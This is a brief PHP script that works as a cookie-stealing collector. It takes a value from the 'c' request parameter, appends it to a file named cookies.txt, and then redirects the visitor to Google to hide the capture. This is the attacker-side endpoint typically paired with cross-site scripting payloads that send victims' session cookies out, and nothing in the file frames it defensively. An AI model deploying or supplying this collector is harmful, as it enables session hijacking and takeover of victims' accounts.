<?php
$cookies = $_REQUEST["c"];
$logfile = "cookies.txt";

$opfile = fopen($logfile, "a");
fwrite($opfile, "$cookies \n");
fclose($opfile);
header("Location: https://www.google.com");
?>
